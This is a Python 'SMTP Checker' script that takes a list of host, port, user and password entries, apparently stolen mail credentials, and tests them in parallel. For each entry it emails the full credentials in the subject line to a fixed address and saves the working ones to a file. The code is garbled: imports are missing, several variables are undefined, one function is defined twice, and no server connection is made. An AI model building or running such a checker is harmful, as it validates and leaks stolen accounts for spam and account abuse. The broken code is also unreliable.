import os
import smtplib



def banner(title):
    my_banner = text2art(title)
    print(my_banner)

# Example usage:
banner("SMTP - Checker")

# Initialize colorama
init(autoreset=True)

# Define color variables
red = Fore.LIGHTRED_EX
cyan = Fore.LIGHTCYAN_EX
green = Fore.LIGHTGREEN_EX

# Add a keyboard shortcut to stop the script


# Create a file to store successful SMTP connections
try:
    open("result.txt", "a")
except:
    pass

def banner(title):
    """
    Prints a ASCII art banner with the provided title
    """
    os.system("cls||clear")
    my_banner = pyfiglet.figlet_format(title, font="slant", justify="center")
    print(cyan + my_banner)
    print(f"\t\t\t{cyan}[ {green}Created By CILIMINIE {cyan}]\n")

def check_smtp(site):
    """
    Attempts to connect to an SMTP server using the provided credentials
    """
    values = site.strip().split("|")
    if len(values) != 4:
        print(red + "[ERROR] Invalid SMTP format. Expected format is: HOST|PORT|USER|PASS")
        return
    HOST, PORT, USER, PASS = site.strip().split("|")
    try:
        # Connect to the SMTP server
       
        msg = MIMEMultipart()
        msg["Subject"] = "hello  : " + HOST + "|" + PORT + "|" + USER + "|" + PASS
        msg["From"] = USER
        msg["To"] = TO_ADDR
  

        msg.attach(MIMEText(DATA_HTML, "html", "utf-8"))
        server.sendmail(USER, [msg["To"]], msg.as_string())
        
        # Print success message and save the credentials to result.txt
   

        print(green + "[GOOD SMTP]"+HOST+"|"+PORT+"|"+USER)

        if f"{HOST}|{PORT}|{USER}|{PASS}" in open("result.txt", "r").read():
            pass
        else:
            open("result.txt", "a").write(f"{HOST}|{PORT}|{USER}|{PASS}" + "\n")
    except:
        # Print failure message
        print(red + "[BAD SMTP]"+HOST+"|"+PORT+"|"+USER+"|"+PASS)

if __name__=="__main__":
    banner("SMTP - Checker")
   
    # Get the SMTP list and number of threads to use
    with open(input(f"{cyan}[{white}?{cyan}] {white}Set Smtp List : "), encoding='latin-1') as input_list:
        smtps = input_list.readlines()


    
    # Create a thread pool and map the check_smtp function to each SMTP in the list
    pool = ThreadPool(thread_count)
    pool.map(check_smtp, smtps)
    pool.close()
    pool.join()
